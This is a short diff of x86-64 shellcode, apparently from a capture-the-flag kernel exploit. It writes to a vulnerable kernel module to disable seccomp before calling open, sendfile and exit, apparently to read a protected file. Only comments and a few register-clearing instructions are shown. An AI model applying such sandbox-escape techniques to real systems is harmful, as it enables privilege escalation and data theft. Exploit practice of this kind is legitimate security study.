@@ -23,7 +23,7 @@ ret
 _start:
   ; write(module_fd, sc, sc_len)
   ; this invokes the `device_write` function of the kernel module
-  ; we NEED to disable seccomp before calling execve
+  ; we NEED to disable seccomp before calling open, sendfile, exit
   xor rdi, rdi
   xor rsi, rsi
   xor rdx, rdx
